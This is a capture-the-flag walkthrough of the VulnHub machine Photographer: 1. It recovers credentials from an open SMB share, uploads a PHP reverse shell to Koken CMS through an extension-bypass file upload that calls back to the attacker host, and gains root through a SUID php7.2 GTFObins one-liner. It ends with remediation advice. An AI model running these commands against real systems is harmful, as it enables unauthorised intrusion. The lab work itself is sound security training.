# Photographer: 1 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.0.76 |
| **Attacker IP** | 192.168.0.100 |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu) |
| **Goal** | root flag (`proof.txt`) |
| **Source** | [HackingArticles](https://www.hackingarticles.in/photographer-1-vulnhub-walkthrough/) |

## Attack Summary

Photographer: 1 exposes a Samba share containing a `mailsent.txt` file with plaintext credentials. A Koken CMS instance on port 8000 is accessible with those credentials. Koken's image import functionality is abused to upload a PHP reverse shell (EDB-48706). Privilege escalation exploits a SUID-flagged `/usr/bin/php7.2` binary via GTFObins to obtain a root shell.

## Methodology

1. Host discovery and nmap scan
2. SMB enumeration with smbclient to extract credentials
3. Login to Koken CMS on port 8000
4. PHP reverse shell upload via Koken file import
5. Privilege escalation via SUID php7.2

---

## Step 1: Host Discovery

```bash
netdiscover -r 192.168.0.0/24
```

---

## Step 2: Port and Service Scan

```bash
nmap -p- -A 192.168.0.76
```

**Open ports:**

| Port | Service | Notes |
|---|---|---|
| 80 | HTTP | Apache, static site |
| 445 | SMB | Samba file sharing |
| 8000 | HTTP | Koken CMS |

![nmap scan](images/01-nmap.png)

---

## Step 3: SMB Enumeration — Extracting Credentials

List available shares:

```bash
smbclient -L //192.168.0.76 -N
```

A share named `sambashare` is present and accessible without credentials.

```bash
smbclient //192.168.0.76/sambashare -N
smb: \> ls
# mailsent.txt
# wordpress.bkp.zip

smb: \> get mailsent.txt
smb: \> get wordpress.bkp.zip
smb: \> exit
```

Read the mail:

```bash
cat mailsent.txt
```

The file contains an email from `Agi Clarence` to `Daisa Ahomi`. The message reveals:

```
To: Daisa Ahomi
...
...password is: babygirl
...
Email: daisa@photographer.com
```

**Credentials:** `daisa@photographer.com` / `babygirl`

![SMB enumeration](images/02-smb.png)

---

## Step 4: Koken CMS Login

Navigate to `http://192.168.0.76:8000` — a Koken CMS photography site is running.

Go to the admin panel:

```
http://192.168.0.76:8000/admin/
```

Log in with `daisa@photographer.com` / `babygirl`.

The admin dashboard loads. The installed Koken version (0.22.24) is vulnerable to arbitrary file upload (EDB-48706).

![Koken CMS login](images/03-koken-login.png)

---

## Step 5: PHP Reverse Shell via Koken Image Import

The Koken file import feature checks file extensions but not MIME types or file content. The bypass: rename a PHP shell to `shell.php.jpg`.

Edit a PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Edit the variables:

```php
$ip = '192.168.0.100';   // Attacker IP
$port = 4444;
```

Rename the file to bypass the extension check:

```bash
mv shell.php shell.php.jpg
```

In the Koken admin panel: **Content > Import Content** — upload `shell.php.jpg`.

Intercept the upload request in Burp Suite and rename the file back:

- In the `Content-Disposition` header, change `filename="shell.php.jpg"` to `filename="shell.php"`

Forward the request.

Start a listener:

```bash
nc -lvp 4444
```

Trigger the shell by browsing to:

```
http://192.168.0.76:8000/storage/originals/XX/YY/shell.php
```

(The exact path is visible in the Koken admin panel after upload.)

A shell is received as `www-data`.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![Upload shell](images/04-upload-shell.png)

---

## Step 6: Privilege Escalation — SUID php7.2

Find SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

`/usr/bin/php7.2` has the SUID bit set. Using the GTFObins technique:

```bash
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```

A root shell is returned.

```bash
id
# uid=33(www-data) gid=33(www-data) euid=0(root)

cat /root/proof.txt
```

![Root flag](images/05-root-flag.png)

---

## Lessons Learned

- Credentials in SMB shares are trivially recovered; sensitive information such as passwords should never be stored in file shares.
- File upload restrictions based solely on extension are insufficient — content-type validation and server-side checks are required.
- SUID on interpreted language binaries (PHP, Python, Perl) is a critical misconfiguration that immediately yields root via GTFObins.

---

## Remediation

| Vulnerability | Fix |
|---|---|
| Credentials in SMB share | Remove plaintext credentials from file shares; use a secrets manager |
| Koken arbitrary file upload (EDB-48706) | Update Koken CMS or replace it with a maintained CMS; validate file content on upload |
| SUID on `/usr/bin/php7.2` | Remove SUID bit: `chmod u-s /usr/bin/php7.2` |
| Weak admin password (`babygirl`) | Enforce strong, unique passwords; enable two-factor authentication |
| Guest-accessible SMB share | Require authentication for all SMB shares; audit share permissions |
